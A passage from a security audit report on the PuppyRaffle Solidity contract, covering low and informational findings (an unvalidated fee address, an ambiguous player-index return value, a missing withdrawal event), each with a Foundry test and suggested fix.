    raffleDuration = _raffleDuration;
    // ...
}

function changeFeeAddress(address newFeeAddress) external onlyOwner {
    feeAddress = newFeeAddress; // No validation
    emit FeeAddressChanged(newFeeAddress);
}
```

## Impact
If the owner (or a compromised owner key) sets feeAddress to the zero address, all accumulated fees will be irreversibly burned when withdrawFees() is called. No other users can provoke this situation, and no additional contract invariants are broken.

## Proof of Concept
1. The contract owner calls `changeFeeAddress(address(0))` by mistake
2. Fees accumulate in the contract over time
3. When `withdrawFees()` is called, all fees are sent to address(0)
4. These funds are permanently lost and cannot be recovered

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract FeeAddressValidationTest is Test {
    PuppyRaffle puppyRaffle;
    address public owner = address(1);
    address public initialFeeAddress = address(2);
    uint256 public entranceFee = 1e18;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            initialFeeAddress,
            1 weeks
        );
    }

    function testChangeFeeAddressToZero() public {
        // Change fee address to zero address
        vm.prank(owner);
        puppyRaffle.changeFeeAddress(address(0));
        
        // Verify fee address was changed to zero
        assertEq(puppyRaffle.feeAddress(), address(0), "Fee address should be zero");
        
        // Enter raffle to generate fees
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Skip ahead to raffle end
        vm.warp(block.timestamp + 1 weeks + 1);
        
        // Select winner to accumulate fees
        puppyRaffle.selectWinner();
        
        // Check that fees were accumulated
        uint256 fees = puppyRaffle.totalFees();
        assertGt(fees, 0, "Should have accumulated fees");
        
        // Try to withdraw fees to zero address
        puppyRaffle.withdrawFees();
        
        // Verify fees were sent to zero address (lost forever)
        assertEq(address(0).balance, fees, "Fees were sent to zero address");
        assertEq(puppyRaffle.totalFees(), 0, "Fees were withdrawn");
        
        console.log("WARNING: %d wei sent to zero address and lost forever", fees);
    }
}

## Suggested Mitigation
Add validation to prevent setting the fee address to address(0):

```solidity
constructor(
    uint256 _entranceFee,
    address _feeAddress,
    uint256 _raffleDuration
) ERC721("Puppy Raffle", "PR") {
    entranceFee = _entranceFee;
    require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    feeAddress = _feeAddress;
    raffleDuration = _raffleDuration;
    // ...
}

function changeFeeAddress(address newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

This simple validation prevents setting the fee address to address(0), ensuring that fees can always be properly withdrawn to a valid address.

## [L-4]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 when a player is not found, which is the same value it would return for the first player in the array. This makes it impossible to distinguish between a player at index 0 and a non-existent player.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // Returns 0 for both the first player and a non-existent player
}
```

## Impact
Because the function is view-only and the contract never relies on its return value for any state-changing logic, the ambiguity cannot be exploited to steal funds, block legitimate refunds, or corrupt state. The worst effect is that off-chain or third-party integrations that *assume* “0 means not found” might mis-handle players that are actually at index 0, resulting in a poor user experience (e.g. refund UI not showing the player). No direct loss of funds or denial-of-service can occur on-chain.

## Proof of Concept
1. Player A is at index 0 in the players array
2. External contract calls getActivePlayerIndex for Player A and gets 0
3. External contract interprets 0 as "player not found" (a common assumption)
4. External contract incorrectly determines Player A is not in the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexAmbiguityTest is Test {
    PuppyRaffle puppyRaffle;
    address public owner = address(1);
    address public firstPlayer = address(2);
    address public secondPlayer = address(3);
    address public nonPlayer = address(99);
    uint256 public entranceFee = 1e18;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            1 weeks
        );
        
        // Enter raffle with firstPlayer at index 0
        address[] memory players = new address[](2);
        players[0] = firstPlayer;
        players[1] = secondPlayer;
        
        vm.deal(address(this), entranceFee * 2);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testGetActivePlayerIndexAmbiguity() public {
        // Get index for first player (should be 0)
        uint256 firstPlayerIndex = puppyRaffle.getActivePlayerIndex(firstPlayer);
        assertEq(firstPlayerIndex, 0, "First player should be at index 0");
        
        // Get index for non-existent player (also returns 0)
        uint256 nonPlayerIndex = puppyRaffle.getActivePlayerIndex(nonPlayer);
        assertEq(nonPlayerIndex, 0, "Non-player should also return 0");
        
        // Demonstrate the ambiguity
        assertEq(firstPlayerIndex, nonPlayerIndex, "Index is ambiguous between first player and non-player");
        
        console.log("First player index: ", firstPlayerIndex);
        console.log("Non-player index: ", nonPlayerIndex);
        console.log("These identical return values create ambiguity for callers");
        
        // This ambiguity could lead to logical errors in external contracts or applications
        // For example, a contract might incorrectly allow a duplicate entry for the first player
        // Or prevent a legitimate refund for the first player
    }
}

## Suggested Mitigation
Modify the function to clearly indicate when a player is not found, either by reverting or by returning a sentinel value that cannot be confused with a valid index:

```solidity
// Option 1: Revert when player is not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("PuppyRaffle: Player not found");
}

// Option 2: Return a sentinel value that cannot be a valid index
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Use max uint256 as sentinel value
}

// Option 3: Return a tuple with a boolean indicating success
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

Option 1 is the clearest if the player is expected to be found in most cases.
Option 2 works if callers need to handle the not-found case without reverting.
Option 3 is the most explicit, providing both the index and a success indicator.



# Info Risk Findings

## [I-1]. Event Consistency issue in PuppyRaffle::withdrawFees

## Description
The contract emits the RaffleEnter event at the end of the enterRaffle function after players have been added, but important state changes in other functions like withdrawFees do not emit events. Additionally, the RaffleRefunded event is emitted at the very end of the refund function, after sending ETH, which could create inconsistency if the transfer fails.

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
    // No event emitted after withdrawing fees
}
```

## Impact
The omission of an event in withdrawFees() only affects off-chain observability and accounting. It does not enable loss of funds, privilege escalation, or denial of service. Therefore the issue is limited to transparency and UX for indexers/analytics tools.

## Proof of Concept
1. The owner calls withdrawFees() to withdraw a large amount of fees
2. No event is emitted, making this substantial financial operation invisible to monitoring systems
3. External systems relying on events to track financial activity would be unaware of this withdrawal
4. This lack of transparency could mask suspicious withdrawal patterns or make accounting difficult

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract EventConsistencyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    uint256 duration = 1 days;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function testMissingWithdrawalEvents() public {
        // First, we need to generate some fees
        // Add players to the raffle
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Fund this contract
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Complete the raffle to generate fees
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();
        
        // At this point, there should be fees that can be withdrawn
        uint256 feesBeforeWithdrawal = puppyRaffle.totalFees();
        assertTrue(feesBeforeWithdrawal > 0, "Should have fees to withdraw");
        
        // Check for events when withdrawing fees
        vm.recordLogs();
        vm.prank(owner);
        puppyRaffle.withdrawFees();
        
        // Get the logs and check if any event was emitted
        Vm.Log[] memory logs = vm.getRecordedLogs();
        
        // Count logs related to our contract
        uint256 contractLogCount = 0;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(puppyRaffle)) {
                contractLogCount++;
            }
        }
        
        // There should be events for important financial operations
        assertEq(contractLogCount, 0, "No events emitted for fee withdrawal");
        console.log("Fees were withdrawn without emitting any events");
        
        // Verify the fees were actually withdrawn
        assertEq(puppyRaffle.totalFees(), 0, "Fees should be reset to 0");
    }
}

## Suggested Mitigation
Add appropriate events for all important state changes, especially financial operations, and ensure events are emitted in the correct order (before external calls) to maintain consistency:

```solidity
// Add a new event for fee withdrawals
event FeesWithdrawn(address indexed to, uint256 amount);

function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    // Emit event before external call
    emit FeesWithdrawn(feeAddress, feesToWithdraw);
    
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

And fix the order of operations in the refund function:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state first
    players[playerIndex] = address(0);
    
    // Emit event before external call
    emit RaffleRefunded(playerAddress);
    
    // Perform external call last
    payable(msg.sender).sendValue(entranceFee);
}
```



